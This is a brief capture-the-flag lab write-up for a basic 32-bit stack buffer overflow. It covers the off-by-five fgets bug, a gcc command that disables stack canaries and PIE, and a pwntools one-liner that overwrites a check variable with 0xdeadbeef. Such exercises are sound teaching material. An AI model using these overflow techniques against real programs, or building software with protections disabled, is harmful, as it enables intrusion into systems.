# ELF x86 - Stack Buffer Overflow Basic 1
![base](https://github.com/user-attachments/assets/bf728ba8-00c5-447c-bcc0-def3ef1b8624)

## Source Analysie

We analyze the code

<img width="1366" height="768" alt="1 3" src="https://github.com/user-attachments/assets/624eea13-4273-4c5a-b238-e75513fd0df0" />

* **Buffer:** `char buf[40]` — The allocated space in the stack.
* **Vulnerability:** `fgets(buf, 45, stdin)` — It reads 45 bytes into a 40-byte buffer.
* **Win Condition:** The local variable `check` must be overwritten with `0xdeadbeef`.

## Compilation and strategy

We compile the code with protection disabled to simulate a vulnerability.

```bash
gcc elf.c -o elf -m32 -fno-stack-protector -z execstack -no-pie -Wno-stringop-overflow
```
![1 4](https://github.com/user-attachments/assets/349842db-4367-458a-a9f5-fcaee2497c11)

-m32: Compiles for 32-bit architecture.
-fno-stack-protector: Disables stack canaries.
-z execstack: Enables executable stack.
-no-pie: Disables Position Independent Executable (static addresses).

```bash
(python3 -c "from pwn import *; sys.stdout.buffer.write(b'A' * 40 + p32(0xdeadbeef)"; cat) | ./elf
```

![1 5](https://github.com/user-attachments/assets/de9e1231-9035-4cd0-b374-99908be30ea8)

